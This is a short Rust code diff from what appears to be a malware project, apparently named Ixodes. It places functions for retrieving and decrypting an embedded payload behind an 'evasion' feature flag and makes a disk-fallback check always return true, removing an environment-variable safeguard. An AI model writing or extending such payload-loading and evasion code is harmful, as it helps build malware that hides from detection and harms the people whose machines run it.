@@ -1,3 +1,4 @@
+#[cfg(feature = "evasion")]
 #[inline]
 pub fn get_embedded_payload() -> Option<Vec<u8>> {
     #[cfg(feature = "embedded_payload")]
@@ -33,14 +34,8 @@ pub fn decrypt_payload(bytes: &[u8]) -> Vec<u8> {
         .collect()
 }
 
+#[cfg(feature = "evasion")]
 #[inline]
 pub fn allow_disk_fallback() -> bool {
-    #[cfg(debug_assertions)]
-    {
-        true
-    }
-    #[cfg(not(debug_assertions))]
-    {
-        env::var_os("IXODES_ALLOW_DISK").is_some()
-    }
+    true
 }
